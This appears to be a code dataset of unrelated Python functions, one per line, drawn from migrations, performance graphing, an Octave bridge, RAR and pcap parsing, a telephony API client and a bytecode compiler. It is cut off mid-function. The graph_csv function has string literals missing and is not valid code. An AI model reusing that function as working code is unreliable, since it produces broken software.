def forwards ( self , orm ) : # Note: Don't use "from appname.models import ModelName".  # Use orm.ModelName to refer to models in this application, # and orm['appname.ModelName'] for models in other applications. print ( "Updating: JednostkaAdministracyjna" ) ja_akt_stan = orm . JednostkaAdministracyjna . objects . all ( ) . aggregate ( Max ( 'stan_na' ) ) [ 'stan_na__max' ] orm . JednostkaAdministracyjna . objects . filter ( stan_na__exact = ja_akt_stan ) . update ( aktywny = True ) orm . JednostkaAdministracyjna . objects . exclude ( stan_na__exact = ja_akt_stan ) . update ( aktywny = False ) print ( "Updating: Miejscowosc" ) m_akt_stan = orm . Miejscowosc . objects . all ( ) . aggregate ( Max ( 'stan_na' ) ) [ 'stan_na__max' ] orm . Miejscowosc . objects . filter ( stan_na__exact = m_akt_stan ) . update ( aktywny = True ) orm . Miejscowosc . objects . exclude ( stan_na__exact = m_akt_stan ) . update ( aktywny = False ) print ( "Updating: RodzajMiejsowosci" ) rm_akt_stan = orm . RodzajMiejsowosci . objects . all ( ) . aggregate ( Max ( 'stan_na' ) ) [ 'stan_na__max' ] orm . RodzajMiejsowosci . objects . filter ( stan_na__exact = rm_akt_stan ) . update ( aktywny = True ) orm . RodzajMiejsowosci . objects . exclude ( stan_na__exact = rm_akt_stan ) . update ( aktywny = False ) print ( "Updating: Ulica" ) u_akt_stan = orm . Ulica . objects . all ( ) . aggregate ( Max ( 'stan_na' ) ) [ 'stan_na__max' ] orm . Ulica . objects . filter ( stan_na__exact = u_akt_stan ) . update ( aktywny = True ) orm . Ulica . objects . exclude ( stan_na__exact = u_akt_stan ) . update ( aktywny = False )
def forwards ( self , orm ) : # Note: Don't use "from appname.models import ModelName".  # Use orm.ModelName to refer to models in this application, # and orm['appname.ModelName'] for models in other applications. LEN_TYPE = { 7 : 'GMI' , 4 : 'POW' , 2 : 'WOJ' , } for ja in orm . JednostkaAdministracyjna . objects . all ( ) : ja . typ = LEN_TYPE [ len ( ja . id ) ] ja . save ( )
def extract_diff_sla_from_config_file ( obj , options_file ) : rule_strings = { } config_obj = ConfigParser . ConfigParser ( ) config_obj . optionxform = str config_obj . read ( options_file ) for section in config_obj . sections ( ) : rule_strings , kwargs = get_rule_strings ( config_obj , section ) for ( key , val ) in rule_strings . iteritems ( ) : set_sla ( obj , section , key , val )
def set_sla ( obj , metric , sub_metric , rules ) : if not hasattr ( obj , 'sla_map' ) : return False rules_list = rules . split ( ) for rule in rules_list : if '<' in rule : stat , threshold = rule . split ( '<' ) sla = SLA ( metric , sub_metric , stat , threshold , 'lt' ) elif '>' in rule : stat , threshold = rule . split ( '>' ) sla = SLA ( metric , sub_metric , stat , threshold , 'gt' ) else : if hasattr ( obj , 'logger' ) : obj . logger . error ( 'Unsupported SLA type defined : ' + rule ) sla = None obj . sla_map [ metric ] [ sub_metric ] [ stat ] = sla if hasattr ( obj , 'sla_list' ) : obj . sla_list . append ( sla ) # TODO : remove this once report has grading done in the metric tables return True
def graph_csv ( output_directory , resource_path , csv_file , plot_title , output_filename , y_label = None , precision = None , graph_height = "600" , graph_width = "1500" ) : if not os . path . getsize ( csv_file ) : return False , "" y_label = y_label or plot_title div_id = str ( random . random ( ) ) div_string = "<div id=\"%s\" style=\"width:%spx; height:%spx;\"></div>" % ( div_id , graph_width , graph_height ) script_string = + div_id + + resource_path + '/' + os . path . basename ( csv_file ) + + y_label + + plot_title + + y_label + with open ( os . path . join ( output_directory , output_filename + '.div' ) , 'w' ) as div_file : div_file . write ( div_string + script_string ) # TODO(ritesh): Also generate PNGs if someone needs them separately return True , os . path . join ( output_directory , output_filename + '.div' )
def convert_to_G ( self , word ) : value = 0.0 if word [ - 1 ] == 'G' or word [ - 1 ] == 'g' : value = float ( word [ : - 1 ] ) elif word [ - 1 ] == 'M' or word [ - 1 ] == 'm' : value = float ( word [ : - 1 ] ) / 1000.0 elif word [ - 1 ] == 'K' or word [ - 1 ] == 'k' : value = float ( word [ : - 1 ] ) / 1000.0 / 1000.0 else : # No unit value = float ( word ) / 1000.0 / 1000.0 / 1000.0 return str ( value )
def plot_diff ( self , graphing_library = 'matplotlib' ) : diff_datasource = sorted ( set ( self . reports [ 0 ] . datasource ) & set ( self . reports [ 1 ] . datasource ) ) graphed = False for submetric in diff_datasource : baseline_csv = naarad . utils . get_default_csv ( self . reports [ 0 ] . local_location , ( submetric + '.percentiles' ) ) current_csv = naarad . utils . get_default_csv ( self . reports [ 1 ] . local_location , ( submetric + '.percentiles' ) ) if ( not ( naarad . utils . is_valid_file ( baseline_csv ) & naarad . utils . is_valid_file ( current_csv ) ) ) : continue baseline_plot = PD ( input_csv = baseline_csv , csv_column = 1 , series_name = submetric , y_label = submetric , precision = None , graph_height = 600 , graph_width = 1200 , graph_type = 'line' , plot_label = 'baseline' , x_label = 'Percentiles' ) current_plot = PD ( input_csv = current_csv , csv_column = 1 , series_name = submetric , y_label = submetric , precision = None , graph_height = 600 , graph_width = 1200 , graph_type = 'line' , plot_label = 'current' , x_label = 'Percentiles' ) graphed , div_file = Diff . graphing_modules [ graphing_library ] . graph_data_on_the_same_graph ( [ baseline_plot , current_plot ] , os . path . join ( self . output_directory , self . resource_path ) , self . resource_path , ( submetric + '.diff' ) ) if graphed : self . plot_files . append ( div_file ) return True
def check_sla ( self , sla , diff_metric ) : try : if sla . display is '%' : diff_val = float ( diff_metric [ 'percent_diff' ] ) else : diff_val = float ( diff_metric [ 'absolute_diff' ] ) except ValueError : return False if not ( sla . check_sla_passed ( diff_val ) ) : self . sla_failures += 1 self . sla_failure_list . append ( DiffSLAFailure ( sla , diff_metric ) ) return True
def plot_timeseries ( self , graphing_library = 'matplotlib' ) : if self . groupby : plot_data = { } # plot time series data for submetrics for out_csv in sorted ( self . csv_files , reverse = True ) : csv_filename = os . path . basename ( out_csv ) transaction_name = "." . join ( csv_filename . split ( '.' ) [ 1 : - 1 ] ) if transaction_name in self . anomalies . keys ( ) : highlight_regions = self . anomalies [ transaction_name ] else : highlight_regions = None # The last element is .csv, don't need that in the name of the chart column = csv_filename . split ( '.' ) [ - 2 ] transaction_name = ' ' . join ( csv_filename . split ( '.' ) [ 1 : - 2 ] ) plot = PD ( input_csv = out_csv , csv_column = 1 , series_name = transaction_name + '.' + column , y_label = column + ' (' + self . sub_metric_description [ column ] + ')' , precision = None , graph_height = 500 , graph_width = 1200 , graph_type = 'line' , highlight_regions = highlight_regions ) if transaction_name in plot_data : plot_data [ transaction_name ] . append ( plot ) else : plot_data [ transaction_name ] = [ plot ] for transaction in plot_data : graphed , div_file = Metric . graphing_modules [ graphing_library ] . graph_data ( plot_data [ transaction ] , self . resource_directory , self . resource_path , self . label + '.' + transaction ) if graphed : self . plot_files . append ( div_file ) else : graphed = False for out_csv in self . csv_files : csv_filename = os . path . basename ( out_csv ) transaction_name = "." . join ( csv_filename . split ( '.' ) [ 1 : - 1 ] ) if transaction_name in self . anomalies . keys ( ) : highlight_regions = self . anomalies [ transaction_name ] else : highlight_regions = None # The last element is .csv, don't need that in the name of the chart column = self . csv_column_map [ out_csv ] column = naarad . utils . sanitize_string ( column ) graph_title = '.' . join ( csv_filename . split ( '.' ) [ 0 : - 1 ] ) if self . sub_metric_description and column in self . sub_metric_description . keys ( ) : graph_title += ' (' + self . sub_metric_description [ column ] + ')' if self . sub_metric_unit and column in self . sub_metric_unit . keys ( ) : plot_data = [ PD ( input_csv = out_csv , csv_column = 1 , series_name = graph_title , y_label = column + ' (' + self . sub_metric_unit [ column ] + ')' , precision = None , graph_height = 600 , graph_width = 1200 , graph_type = 'line' , highlight_regions = highlight_regions ) ] else : plot_data = [ PD ( input_csv = out_csv , csv_column = 1 , series_name = graph_title , y_label = column , precision = None , graph_height = 600 , graph_width = 1200 , graph_type = 'line' , highlight_regions = highlight_regions ) ] graphed , div_file = Metric . graphing_modules [ graphing_library ] . graph_data ( plot_data , self . resource_directory , self . resource_path , graph_title ) if graphed : self . plot_files . append ( div_file ) return True
def check_important_sub_metrics ( self , sub_metric ) : if not self . important_sub_metrics : return False if sub_metric in self . important_sub_metrics : return True items = sub_metric . split ( '.' ) if items [ - 1 ] in self . important_sub_metrics : return True return False
def plot_cdf ( self , graphing_library = 'matplotlib' ) : graphed = False for percentile_csv in self . percentiles_files : csv_filename = os . path . basename ( percentile_csv ) # The last element is .csv, don't need that in the name of the chart column = self . csv_column_map [ percentile_csv . replace ( ".percentiles." , "." ) ] if not self . check_important_sub_metrics ( column ) : continue column = naarad . utils . sanitize_string ( column ) graph_title = '.' . join ( csv_filename . split ( '.' ) [ 0 : - 1 ] ) if self . sub_metric_description and column in self . sub_metric_description . keys ( ) : graph_title += ' (' + self . sub_metric_description [ column ] + ')' if self . sub_metric_unit and column in self . sub_metric_unit . keys ( ) : plot_data = [ PD ( input_csv = percentile_csv , csv_column = 1 , series_name = graph_title , x_label = 'Percentiles' , y_label = column + ' (' + self . sub_metric_unit [ column ] + ')' , precision = None , graph_height = 600 , graph_width = 1200 , graph_type = 'line' ) ] else : plot_data = [ PD ( input_csv = percentile_csv , csv_column = 1 , series_name = graph_title , x_label = 'Percentiles' , y_label = column , precision = None , graph_height = 600 , graph_width = 1200 , graph_type = 'line' ) ] graphed , div_file = Metric . graphing_modules [ graphing_library ] . graph_data_on_the_same_graph ( plot_data , self . resource_directory , self . resource_path , graph_title ) if graphed : self . plot_files . append ( div_file ) return True
def parse_innotop_mode_b ( self ) : with open ( self . infile , 'r' ) as infh : # Pre processing to figure out different headers max_row_quot = 0 valrow = - 1 thisrowcolumns = { } data = { } while True : line1 = infh . readline ( ) words = line1 . split ( ) # special case for -I (iostat) option # skipping all the 'thread' lines if words [ 1 ] == "thread" and self . metric_type == "INNOTOP-I" : while True : line1 = infh . readline ( ) words = line1 . split ( ) if naarad . utils . is_number ( words [ 1 ] ) : line1 = infh . readline ( ) else : break if words [ 1 ] == "thread" and self . metric_type == "INNOTOP-R" : break # Skip next line infh . readline ( ) last_ts = words [ 0 ] . strip ( ) . replace ( 'T' , ' ' ) if not naarad . utils . is_number ( words [ 1 ] ) : thisrowcolumns [ max_row_quot ] = words [ 1 : ] for column in words [ 1 : ] : if self . options and column not in self . options : continue data [ column ] = [ ] if self . metric_type == "INNOTOP-I" : data [ "check_pt_age" ] = [ ] max_row_quot += 1 else : break # infh.seek(0) # Real Processing for line in infh : l = line . strip ( ) . split ( ' ' , 1 ) if len ( l ) <= 1 : continue ts = l [ 0 ] . strip ( ) . replace ( 'T' , ' ' ) if not ts == last_ts : last_ts = ts valrow = - 1 try : words = l [ 1 ] . strip ( ) . split ( '\t' ) except IndexError : logger . warn ( "Bad line: %s" , line ) continue # special case for -I (iostat) option # skipping all the 'thread' lines if words [ 0 ] == "thread" or ( naarad . utils . is_number ( words [ 0 ] ) and "thread" in words [ 1 ] ) : continue if naarad . utils . is_number ( words [ 0 ] ) : valrow += 1 quot = valrow % max_row_quot # Special case for -R, skipping all 'thread' value lines if quot >= len ( thisrowcolumns ) : continue columns = thisrowcolumns [ quot ] if len ( words ) > len ( columns ) : continue for i in range ( len ( words ) ) : if self . options and columns [ i ] not in self . options : continue column = columns [ i ] # Converting -- to 0, seen this for buf_pool_hit_rate if words [ i ] == "--" : words [ i ] = "0" ts = naarad . utils . reconcile_timezones ( ts , self . timezone , self . graph_timezone ) # Calculating check point age if self . metric_type == "INNOTOP-I" : if column == "log_seq_no" : log_seq_no = int ( words [ i ] ) elif column == "log_flushed_to" : check_pt_age = log_seq_no - int ( words [ i ] ) tup = [ ts , str ( check_pt_age ) ] data [ "check_pt_age" ] . append ( tup ) tup = [ ts , words [ i ] ] data [ column ] . append ( tup ) # Post Proc, writing the different out files for column in data : csvfile = self . get_csv ( column ) self . csv_files . append ( csvfile ) with open ( csvfile , 'w' ) as outfh : for tup in data [ column ] : outfh . write ( ',' . join ( tup ) ) outfh . write ( '\n' ) return True
def _set_scores ( self ) : anom_scores = { } self . _compute_derivatives ( ) derivatives_ema = utils . compute_ema ( self . smoothing_factor , self . derivatives ) for i , ( timestamp , value ) in enumerate ( self . time_series_items ) : anom_scores [ timestamp ] = abs ( self . derivatives [ i ] - derivatives_ema [ i ] ) stdev = numpy . std ( anom_scores . values ( ) ) if stdev : for timestamp in anom_scores . keys ( ) : anom_scores [ timestamp ] /= stdev self . anom_scores = TimeSeries ( self . _denoise_scores ( anom_scores ) )
def exit ( self ) : if self . _engine : self . _engine . repl . terminate ( ) self . _engine = None
def restart ( self ) : if self . _engine : self . _engine . repl . terminate ( ) executable = self . _executable if executable : os . environ [ 'OCTAVE_EXECUTABLE' ] = executable if 'OCTAVE_EXECUTABLE' not in os . environ and 'OCTAVE' in os . environ : os . environ [ 'OCTAVE_EXECUTABLE' ] = os . environ [ 'OCTAVE' ] self . _engine = OctaveEngine ( stdin_handler = self . _handle_stdin , logger = self . logger ) self . _engine . eval ( 'addpath("%s");' % HERE . replace ( osp . sep , '/' ) )
def _feval ( self , func_name , func_args = ( ) , dname = '' , nout = 0 , timeout = None , stream_handler = None , store_as = '' , plot_dir = None ) : engine = self . _engine if engine is None : raise Oct2PyError ( 'Session is closed' ) out_file = osp . join ( self . temp_dir , 'writer.mat' ) out_file = out_file . replace ( osp . sep , '/' ) in_file = osp . join ( self . temp_dir , 'reader.mat' ) in_file = in_file . replace ( osp . sep , '/' ) func_args = list ( func_args ) ref_indices = [ ] for ( i , value ) in enumerate ( func_args ) : if isinstance ( value , OctavePtr ) : ref_indices . append ( i + 1 ) func_args [ i ] = value . address ref_indices = np . array ( ref_indices ) req = dict ( func_name = func_name , func_args = tuple ( func_args ) , dname = dname or '' , nout = nout , store_as = store_as or '' , ref_indices = ref_indices ) write_file ( req , out_file , oned_as = self . _oned_as , convert_to_float = self . convert_to_float ) engine . stream_handler = stream_handler or self . logger . info if timeout is None : timeout = self . timeout try : engine . eval ( '_pyeval("%s", "%s");' % ( out_file , in_file ) , timeout = timeout ) except KeyboardInterrupt as e : stream_handler ( engine . repl . interrupt ( ) ) raise except TIMEOUT : stream_handler ( engine . repl . interrupt ( ) ) raise Oct2PyError ( 'Timed out, interrupting' ) except EOF : stream_handler ( engine . repl . child . before ) self . restart ( ) raise Oct2PyError ( 'Session died, restarting' ) resp = read_file ( in_file , self ) if resp [ 'err' ] : msg = self . _parse_error ( resp [ 'err' ] ) raise Oct2PyError ( msg ) result = resp [ 'result' ] . ravel ( ) . tolist ( ) if isinstance ( result , list ) and len ( result ) == 1 : result = result [ 0 ] if ( isinstance ( result , Cell ) and result . size == 1 and isinstance ( result [ 0 ] , string_types ) and result [ 0 ] == '__no_value__' ) : result = None if plot_dir : self . _engine . make_figures ( plot_dir ) return result
def _parse_error ( self , err ) : self . logger . debug ( err ) stack = err . get ( 'stack' , [ ] ) if not err [ 'message' ] . startswith ( 'parse error:' ) : err [ 'message' ] = 'error: ' + err [ 'message' ] errmsg = 'Octave evaluation error:\n%s' % err [ 'message' ] if not isinstance ( stack , StructArray ) : return errmsg errmsg += '\nerror: called from:' for item in stack [ : - 1 ] : errmsg += '\n    %(name)s at line %(line)d' % item try : errmsg += ', column %(column)d' % item except Exception : pass return errmsg
def _isobject ( self , name , exist ) : if exist in [ 2 , 5 ] : return False cmd = 'isobject(%s)' % name resp = self . _engine . eval ( cmd , silent = True ) . strip ( ) return resp == 'ans =  1'
def _get_function_ptr ( self , name ) : func = _make_function_ptr_instance self . _function_ptrs . setdefault ( name , func ( self , name ) ) return self . _function_ptrs [ name ]
def _get_user_class ( self , name ) : self . _user_classes . setdefault ( name , _make_user_class ( self , name ) ) return self . _user_classes [ name ]
def _cleanup ( self ) : self . exit ( ) workspace = osp . join ( os . getcwd ( ) , 'octave-workspace' ) if osp . exists ( workspace ) : os . remove ( workspace )
def read_file ( path , session = None ) : try : data = loadmat ( path , struct_as_record = True ) except UnicodeDecodeError as e : raise Oct2PyError ( str ( e ) ) out = dict ( ) for ( key , value ) in data . items ( ) : out [ key ] = _extract ( value , session ) return out
def write_file ( obj , path , oned_as = 'row' , convert_to_float = True ) : data = _encode ( obj , convert_to_float ) try : with _WRITE_LOCK : savemat ( path , data , appendmat = False , oned_as = oned_as , long_field_names = True ) except KeyError : raise Exception ( 'could not save mat file' )
def _extract ( data , session = None ) : if isinstance ( data , list ) : return [ _extract ( d , session ) for d in data ] if not isinstance ( data , np . ndarray ) : return data if isinstance ( data , MatlabObject ) : cls = session . _get_user_class ( data . classname ) return cls . from_value ( data ) if data . dtype . names : if data . size == 1 : return _create_struct ( data , session ) return StructArray ( data , session ) if data . dtype . kind == 'O' : return Cell ( data , session ) if data . size == 1 : return data . item ( ) if data . size == 0 : if data . dtype . kind in 'US' : return '' return [ ] return data
def _create_struct ( data , session ) : out = Struct ( ) for name in data . dtype . names : item = data [ name ] if isinstance ( item , np . ndarray ) and item . dtype . kind == 'O' : item = item . squeeze ( ) . tolist ( ) out [ name ] = _extract ( item , session ) return out
def _encode ( data , convert_to_float ) : ctf = convert_to_float if isinstance ( data , ( OctaveVariablePtr ) ) : return _encode ( data . value , ctf ) if isinstance ( data , OctaveUserClass ) : return _encode ( OctaveUserClass . to_value ( data ) , ctf ) if isinstance ( data , ( OctaveFunctionPtr , MatlabFunction ) ) : raise Oct2PyError ( 'Cannot write Octave functions' ) if isinstance ( data , MatlabObject ) : view = data . view ( np . ndarray ) out = MatlabObject ( data , data . classname ) for name in out . dtype . names : out [ name ] = _encode ( view [ name ] , ctf ) return out if isinstance ( data , ( DataFrame , Series ) ) : return _encode ( data . values , ctf ) if isinstance ( data , dict ) : out = dict ( ) for ( key , value ) in data . items ( ) : out [ key ] = _encode ( value , ctf ) return out if data is None : return np . NaN if isinstance ( data , set ) : return _encode ( list ( data ) , ctf ) if isinstance ( data , list ) : if _is_simple_numeric ( data ) : return _encode ( np . array ( data ) , ctf ) return _encode ( tuple ( data ) , ctf ) if isinstance ( data , tuple ) : obj = np . empty ( len ( data ) , dtype = object ) for ( i , item ) in enumerate ( data ) : obj [ i ] = _encode ( item , ctf ) return obj if isinstance ( data , spmatrix ) : return data . astype ( np . float64 ) if not isinstance ( data , np . ndarray ) : return data if data . dtype . kind in 'OV' : out = np . empty ( data . size , dtype = data . dtype ) for ( i , item ) in enumerate ( data . ravel ( ) ) : if data . dtype . names : for name in data . dtype . names : out [ i ] [ name ] = _encode ( item [ name ] , ctf ) else : out [ i ] = _encode ( item , ctf ) return out . reshape ( data . shape ) if data . dtype . name == 'complex256' : return data . astype ( np . complex128 ) if ctf and data . dtype . kind in 'ui' : return data . astype ( np . float64 ) return data
def _is_simple_numeric ( data ) : for item in data : if isinstance ( item , set ) : item = list ( item ) if isinstance ( item , list ) : if not _is_simple_numeric ( item ) : return False elif not isinstance ( item , ( int , float , complex ) ) : return False return True
def _setup_log ( ) : try : handler = logging . StreamHandler ( stream = sys . stdout ) except TypeError : handler = logging . StreamHandler ( strm = sys . stdout ) log = get_log ( ) log . addHandler ( handler ) log . setLevel ( logging . INFO ) log . propagate = False
def _make_user_class ( session , name ) : attrs = session . eval ( 'fieldnames(%s);' % name , nout = 1 ) . ravel ( ) . tolist ( ) methods = session . eval ( 'methods(%s);' % name , nout = 1 ) . ravel ( ) . tolist ( ) ref = weakref . ref ( session ) doc = _DocDescriptor ( ref , name ) values = dict ( __doc__ = doc , _name = name , _ref = ref , _attrs = attrs , __module__ = 'oct2py.dynamic' ) for method in methods : doc = _MethodDocDescriptor ( ref , name , method ) cls_name = '%s_%s' % ( name , method ) method_values = dict ( __doc__ = doc ) method_cls = type ( str ( cls_name ) , ( OctaveUserClassMethod , ) , method_values ) values [ method ] = method_cls ( ref , method , name ) for attr in attrs : values [ attr ] = OctaveUserClassAttr ( ref , attr , attr ) return type ( str ( name ) , ( OctaveUserClass , ) , values )
def to_value ( cls , instance ) : if not isinstance ( instance , OctaveUserClass ) or not instance . _attrs : return dict ( ) # Bootstrap a MatlabObject from scipy.io dtype = [ ] values = [ ] for attr in instance . _attrs : dtype . append ( ( str ( attr ) , object ) ) values . append ( getattr ( instance , attr ) ) struct = np . array ( [ tuple ( values ) ] , dtype ) return MatlabObject ( struct , instance . _name )
def to_pointer ( cls , instance ) : return OctavePtr ( instance . _ref , instance . _name , instance . _address )
def document_func_view ( serializer_class = None , response_serializer_class = None , filter_backends = None , permission_classes = None , authentication_classes = None , doc_format_args = list ( ) , doc_format_kwargs = dict ( ) ) : def decorator ( func ) : if serializer_class : func . cls . serializer_class = func . view_class . serializer_class = serializer_class if response_serializer_class : func . cls . response_serializer_class = func . view_class . response_serializer_class = response_serializer_class if filter_backends : func . cls . filter_backends = func . view_class . filter_backends = filter_backends if permission_classes : func . cls . permission_classes = func . view_class . permission_classes = permission_classes if authentication_classes : func . cls . authentication_classes = func . view_class . authentication_classes = authentication_classes if doc_format_args or doc_format_kwargs : func . cls . __doc__ = func . view_class . __doc__ = getdoc ( func ) . format ( * doc_format_args , * * doc_format_kwargs ) return func return decorator
def format_docstring ( * args , * * kwargs ) : def decorator ( func ) : func . __doc__ = getdoc ( func ) . format ( * args , * * kwargs ) return func return decorator
def is_rarfile ( filename ) : mode = constants . RAR_OM_LIST_INCSPLIT archive = unrarlib . RAROpenArchiveDataEx ( filename , mode = mode ) try : handle = unrarlib . RAROpenArchiveEx ( ctypes . byref ( archive ) ) except unrarlib . UnrarException : return False unrarlib . RARCloseArchive ( handle ) return ( archive . OpenResult == constants . SUCCESS )
def _read_header ( self , handle ) : header_data = unrarlib . RARHeaderDataEx ( ) try : res = unrarlib . RARReadHeaderEx ( handle , ctypes . byref ( header_data ) ) rarinfo = RarInfo ( header = header_data ) except unrarlib . ArchiveEnd : return None except unrarlib . MissingPassword : raise RuntimeError ( "Archive is encrypted, password required" ) except unrarlib . BadPassword : raise RuntimeError ( "Bad password for Archive" ) except unrarlib . UnrarException as e : raise BadRarFile ( str ( e ) ) return rarinfo
def _process_current ( self , handle , op , dest_path = None , dest_name = None ) : unrarlib . RARProcessFileW ( handle , op , dest_path , dest_name )
def _load_metadata ( self , handle ) : rarinfo = self . _read_header ( handle ) while rarinfo : self . filelist . append ( rarinfo ) self . NameToInfo [ rarinfo . filename ] = rarinfo self . _process_current ( handle , constants . RAR_SKIP ) rarinfo = self . _read_header ( handle )
def _open ( self , archive ) : try : handle = unrarlib . RAROpenArchiveEx ( ctypes . byref ( archive ) ) except unrarlib . UnrarException : raise BadRarFile ( "Invalid RAR file." ) return handle
def namelist ( self ) : names = [ ] for member in self . filelist : names . append ( member . filename ) return names
def getinfo ( self , name ) : rarinfo = self . NameToInfo . get ( name ) if rarinfo is None : raise KeyError ( 'There is no item named %r in the archive' % name ) return rarinfo
def printdir ( self ) : print ( "%-46s %19s %12s" % ( "File Name" , "Modified    " , "Size" ) ) for rarinfo in self . filelist : date = "%d-%02d-%02d %02d:%02d:%02d" % rarinfo . date_time [ : 6 ] print ( "%-46s %s %12d" % ( rarinfo . filename , date , rarinfo . file_size ) )
def dostime_to_timetuple ( dostime ) : dostime = dostime >> 16 dostime = dostime & 0xffff day = dostime & 0x1f month = ( dostime >> 5 ) & 0xf year = 1980 + ( dostime >> 9 ) second = 2 * ( dostime & 0x1f ) minute = ( dostime >> 5 ) & 0x3f hour = dostime >> 11 return ( year , month , day , hour , minute , second )
def _c_func ( func , restype , argtypes , errcheck = None ) : func . restype = restype func . argtypes = argtypes if errcheck is not None : func . errcheck = errcheck return func
def _load_savefile_header ( file_h ) : try : raw_savefile_header = file_h . read ( 24 ) except UnicodeDecodeError : print ( "\nMake sure the input file is opened in read binary, 'rb'\n" ) raise InvalidEncoding ( "Could not read file; it might not be opened in binary mode." ) # in case the capture file is not the same endianness as ours, we have to # use the correct byte order for the file header if raw_savefile_header [ : 4 ] in [ struct . pack ( ">I" , _MAGIC_NUMBER ) , struct . pack ( ">I" , _MAGIC_NUMBER_NS ) ] : byte_order = b'big' unpacked = struct . unpack ( '>IhhIIII' , raw_savefile_header ) elif raw_savefile_header [ : 4 ] in [ struct . pack ( "<I" , _MAGIC_NUMBER ) , struct . pack ( "<I" , _MAGIC_NUMBER_NS ) ] : byte_order = b'little' unpacked = struct . unpack ( '<IhhIIII' , raw_savefile_header ) else : raise UnknownMagicNumber ( "No supported Magic Number found" ) ( magic , major , minor , tz_off , ts_acc , snaplen , ll_type ) = unpacked header = __pcap_header__ ( magic , major , minor , tz_off , ts_acc , snaplen , ll_type , ctypes . c_char_p ( byte_order ) , magic == _MAGIC_NUMBER_NS ) if not __validate_header__ ( header ) : raise InvalidHeader ( "Invalid Header" ) else : return header
def strip_ip ( packet ) : if not isinstance ( packet , IP ) : packet = IP ( packet ) payload = packet . payload return payload
def strip_ethernet ( packet ) : if not isinstance ( packet , Ethernet ) : packet = Ethernet ( packet ) payload = packet . payload return payload
def reload_config ( self , call_params ) : path = '/' + self . api_version + '/ReloadConfig/' method = 'POST' return self . request ( path , method , call_params )
def reload_cache_config ( self , call_params ) : path = '/' + self . api_version + '/ReloadCacheConfig/' method = 'POST' return self . request ( path , method , call_params )
def transfer_call ( self , call_params ) : path = '/' + self . api_version + '/TransferCall/' method = 'POST' return self . request ( path , method , call_params )
def hangup_all_calls ( self ) : path = '/' + self . api_version + '/HangupAllCalls/' method = 'POST' return self . request ( path , method )
def hangup_call ( self , call_params ) : path = '/' + self . api_version + '/HangupCall/' method = 'POST' return self . request ( path , method , call_params )
def schedule_hangup ( self , call_params ) : path = '/' + self . api_version + '/ScheduleHangup/' method = 'POST' return self . request ( path , method , call_params )
def cancel_scheduled_hangup ( self , call_params ) : path = '/' + self . api_version + '/CancelScheduledHangup/' method = 'POST' return self . request ( path , method , call_params )
def conference_mute ( self , call_params ) : path = '/' + self . api_version + '/ConferenceMute/' method = 'POST' return self . request ( path , method , call_params )
def play ( self , call_params ) : path = '/' + self . api_version + '/Play/' method = 'POST' return self . request ( path , method , call_params )
def play_stop ( self , call_params ) : path = '/' + self . api_version + '/PlayStop/' method = 'POST' return self . request ( path , method , call_params )
def schedule_play ( self , call_params ) : path = '/' + self . api_version + '/SchedulePlay/' method = 'POST' return self . request ( path , method , call_params )
def cancel_scheduled_play ( self , call_params ) : path = '/' + self . api_version + '/CancelScheduledPlay/' method = 'POST' return self . request ( path , method , call_params )
def sound_touch ( self , call_params ) : path = '/' + self . api_version + '/SoundTouch/' method = 'POST' return self . request ( path , method , call_params )
def sound_touch_stop ( self , call_params ) : path = '/' + self . api_version + '/SoundTouchStop/' method = 'POST' return self . request ( path , method , call_params )
def send_digits ( self , call_params ) : path = '/' + self . api_version + '/SendDigits/' method = 'POST' return self . request ( path , method , call_params )
def conference_unmute ( self , call_params ) : path = '/' + self . api_version + '/ConferenceUnmute/' method = 'POST' return self . request ( path , method , call_params )
def conference_kick ( self , call_params ) : path = '/' + self . api_version + '/ConferenceKick/' method = 'POST' return self . request ( path , method , call_params )
def conference_hangup ( self , call_params ) : path = '/' + self . api_version + '/ConferenceHangup/' method = 'POST' return self . request ( path , method , call_params )
def conference_deaf ( self , call_params ) : path = '/' + self . api_version + '/ConferenceDeaf/' method = 'POST' return self . request ( path , method , call_params )
def conference_undeaf ( self , call_params ) : path = '/' + self . api_version + '/ConferenceUndeaf/' method = 'POST' return self . request ( path , method , call_params )
def conference_record_start ( self , call_params ) : path = '/' + self . api_version + '/ConferenceRecordStart/' method = 'POST' return self . request ( path , method , call_params )
def conference_play ( self , call_params ) : path = '/' + self . api_version + '/ConferencePlay/' method = 'POST' return self . request ( path , method , call_params )
def conference_speak ( self , call_params ) : path = '/' + self . api_version + '/ConferenceSpeak/' method = 'POST' return self . request ( path , method , call_params )
def conference_list ( self , call_params ) : path = '/' + self . api_version + '/ConferenceList/' method = 'POST' return self . request ( path , method , call_params )
def conference_list_members ( self , call_params ) : path = '/' + self . api_version + '/ConferenceListMembers/' method = 'POST' return self . request ( path , method , call_params )
def _xml ( self , root ) : element = root . createElement ( self . name ) # Add attributes keys = self . attrs . keys ( ) keys . sort ( ) for a in keys : element . setAttribute ( a , self . attrs [ a ] ) if self . body : text = root . createTextNode ( self . body ) element . appendChild ( text ) for c in self . elements : element . appendChild ( c . _xml ( root ) ) return element
def add_node ( self , label ) : try : n = self . _nodes [ label ] except KeyError : n = Node ( ) n [ 'label' ] = label self . _nodes [ label ] = n return n
def add_edge ( self , n1_label , n2_label , directed = False ) : n1 = self . add_node ( n1_label ) n2 = self . add_node ( n2_label ) e = Edge ( n1 , n2 , directed ) self . _edges . append ( e ) return e
def node ( self , node ) : if node == self . node1 : return self . node2 elif node == self . node2 : return self . node1 else : return None
def _arg_parser ( ) : description = "Converts a completezip to a litezip" parser = argparse . ArgumentParser ( description = description ) verbose_group = parser . add_mutually_exclusive_group ( ) verbose_group . add_argument ( '-v' , '--verbose' , action = 'store_true' , dest = 'verbose' , default = None , help = "increase verbosity" ) verbose_group . add_argument ( '-q' , '--quiet' , action = 'store_false' , dest = 'verbose' , default = None , help = "print nothing to stdout or stderr" ) parser . add_argument ( 'location' , help = "Location of the unpacked litezip" ) return parser
def to_bytes ( self , previous : bytes ) : # First, validate the lengths. if len ( self . conditions ) != len ( self . body ) : raise exc . CompileError ( "Conditions and body length mismatch!" ) bc = b"" prev_len = len ( previous ) # Loop over the conditions and bodies for condition , body in zip ( self . conditions , self . body ) : # Generate the conditional data. cond_bytecode = condition . to_bytecode ( previous ) bc += cond_bytecode # Complex calculation. First, generate the bytecode for all tokens in the body. Then # we calculate the len() of that. We create a POP_JUMP_IF_FALSE operation that jumps # to the instructions after the body code + 3 for the pop call. This is done for all # chained IF calls, as if it was an elif call. Else calls are not possible to be # auto-generated, but it is possible to emulate them using an elif call that checks # for the opposite of the above IF. # Call the _compile_func method from compiler to compile the body. body_bc = compiler . compile_bytecode ( body ) bdyl = len ( body_bc ) # Add together the lengths. gen_len = prev_len + len ( cond_bytecode ) + 